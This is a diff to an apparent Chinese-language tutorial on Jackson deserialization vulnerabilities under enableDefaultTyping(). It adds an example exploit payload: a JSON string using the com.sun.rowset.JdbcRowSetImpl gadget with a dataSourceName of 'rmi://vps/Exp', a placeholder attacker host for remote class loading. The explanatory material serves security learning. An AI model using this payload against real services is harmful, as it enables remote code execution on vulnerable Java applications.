@@ -32,6 +32,14 @@ ObjectMapper mapper = new ObjectMapper();
 mapper.enableDefaultTyping();
 ```
 
+列举一个利用payload大概格式如此
+
+```java
+String json = "[\"com.sun.rowset.JdbcRowSetImpl\", {\"dataSourceName\":\"rmi://vps/Exp\", \"autoCommit\":true}]";
+```
+
+
+
 ### 第二种
 
 简单举个例子来理解下，新增一个Test类
